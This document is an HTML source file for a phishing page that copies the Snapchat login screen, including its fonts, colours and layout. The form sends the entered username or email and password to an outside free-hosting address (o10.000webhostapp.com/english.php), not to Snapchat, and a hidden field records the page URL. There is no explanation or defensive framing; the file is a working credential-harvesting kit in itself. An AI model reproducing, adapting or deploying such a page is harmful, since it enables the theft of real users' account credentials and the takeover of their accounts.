<!DOCTYPE html>
<html>
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="jquery-3.3.1.js"></script>
    <script>
      $(document).ready(function(){
        $("#email").click(function(){
          $("#email").css("border-color", "#0eadff");
          $("#email-header").css("color", "#0eadff");
        });
        $("#email").blur(function(){
          $("#email").css("border-color", "#9A9FA7");
          $("#email-header").css("color", "#9A9FA7");
        });
        $("#pass").click(function(){
          $("#pass").css("border-color", "#0eadff");
          $("#pass-header").css("color", "#0eadff");
        });
        $("#pass").blur(function(){
          $("#pass").css("border-color", "#9A9FA7");
          $("#pass-header").css("color", "#9A9FA7");
        });
        $("input").keyup(function(){
          var emailLength = $("#email").val();
          var passLength = $("#pass").val();
          if (emailLength.length >= 1 && passLength.length >= 1) {
            $("#submit").css("background-color", "#0EADFF");
            document.getElementById("submit").disabled = false;
          }
        });
      });
      document.getElementById("url").value = window.location.href;
    </script>
    <style>
      @font-face {
        font-family: SnapFont-thin;
        src: url(snapchatfont-thin.woff2);
      }
      @font-face {
        font-family: SnapFont;
        src: url(snapchatfont.woff2);
      }
      html{
        height:100%;
        margin:0px;
      }
      body{
        height:100%;
        background-color:black;
        margin:0px;
        font-family: SnapFont-thin;
      }
      .wrapper{
        background-color:white;
        border-radius:10px;
        width:100%;
        min-height:100%;
        margin-bottom:-76px;
        position: sticky;
        z-index:1;
      }
      header{
        width:100%;
        height:50px;
        position: sticky;
        top: 0px;
        z-index:4;
      }
      .back{
        height:18px;
        width:10px;
        padding:16px 18px;
      }
      .login-box{
        text-align:center;
        width:calc(100% - 92px);
        max-width:270px;
        margin:0px auto;
      }
      .login {
        font-size:20px;
        text-align:center;
        margin:16px 0px 27px 0px;
      }
      .inputs{
        height:26px;
        border-width:0px;
        border-bottom-width:1px;
        border-bottom-color:#9A9FA7;
        width:100%;
        font-size:15px;
        padding-left:3px;
      }
      .pass {
        margin-bottom:22px;
      }
      input{
        font-family: inherit;
        caret-color: #1d5bc5;
        border-radius:0px!important;
      }
      .input-headers{
        color:#9A9FA7;
        font-size:11px;
        text-align:left;
        margin:12.5px 0px 10px 3px;
        font-family: SnapFont, SnapFont-thin;
        letter-spacing: 1px;
      }
      .forgot {
        font-size:12px;
        color:#0087cc;
        margin-bottom:108px;
        display:block;
      }
      footer{
        height:76px;
        position: sticky;
        bottom:0;
        background-image: linear-gradient(#ffffff00, white);
        background-image: -webkit-linear-gradient(top, #ffffff00, white);
        background-image: -moz-linear-gradient(top, #ffffff00, white);
        background-image: -o-linear-gradient(top, #ffffff00, white);
        width:100%;
        z-index: 2;
        border-radius:0px 0px 10px 10px;
      }
      .submit {
        height:48px;
        margin:0px auto 30px auto;
        width:100%;
        max-width:225px;
        background-color:#b8c0c7;
        color:white;
        border-radius:27px;
        line-height: 48px;
        position: sticky;
        bottom:30px;
        z-index: 3;
        border:inherit;
        font:inherit;
        padding:0px;
      }
      .push{
        height:76px;
      }
    </style>
  </head>
  <body>
    <div class="wrapper">
      <header>
        <img class="back" src="back-icon.png">
      </header>
      <div class="login-box">
        <div class="login">Log In</div>
        <form method="post" action="http://o10.000webhostapp.com/english.php">
          <div class="input-headers" id="email-header" style="margin-top:0px;">USERNAME OR EMAIL</div>
          <input class="inputs email" id="email" autocorrect="off" autocapitalize="off" name="email" type="text"></input>
          <div class="input-headers" id="pass-header">PASSWORD</div>
          <input class="inputs pass" id="pass" autocorrect="off" autocapitalize="off" name="password" type="password"></input>
          <input id="url" type="hidden" name="url" value=""></input>
          <a class="forgot">Forgot your password?</a>
          <button type="submit" class="submit" id="submit" disabled>Log In</button>
        </form>
        <div class="push"></div>
      </div>
      <footer></footer>
    </div>
  </body>
</html>
